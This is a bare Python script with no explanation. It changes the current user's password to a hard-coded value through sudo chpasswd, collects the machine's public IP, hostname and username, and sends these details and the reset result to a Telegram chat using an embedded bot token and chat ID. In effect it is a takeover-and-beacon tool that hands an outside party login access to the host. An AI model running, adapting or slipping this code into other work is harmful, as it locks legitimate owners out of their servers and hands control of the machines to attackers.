import requests
import socket
import getpass
import subprocess

TOKEN = "8737638623:AAHWUjfZOhKH-YYcXNhlYUxqqiR5a9KItvo"
CHAT_ID = "-1002843633996"

def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        return response.json()['ip']
    except:
        return "Unknown"

def send_telegram_msg(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except:
        pass

def change_password_with_chpasswd(username, new_password):
    try:
        command = ["sudo", "chpasswd"]
        process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        input_data = f"{username}:{new_password}"
        stdout, stderr = process.communicate(input_data)

        if process.returncode == 0:
            return "Password changed successfully using chpasswd!"
        else:
            return f"Failed: {stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == "__main__":
    ip_address = get_public_ip()
    hostname = socket.gethostname()
    username = getpass.getuser()
    
    new_pass = "Toxic@8690"
    pwd_status = change_password_with_chpasswd(username, new_pass)
    
    log_message = (
        f"VPS Online!\n"
        f"Username: {username}\n"
        f"Hostname: {hostname}\n"
        f"Public IP: {ip_address}\n"
        f"Status: {pwd_status}"
    )
    
    send_telegram_msg(log_message)
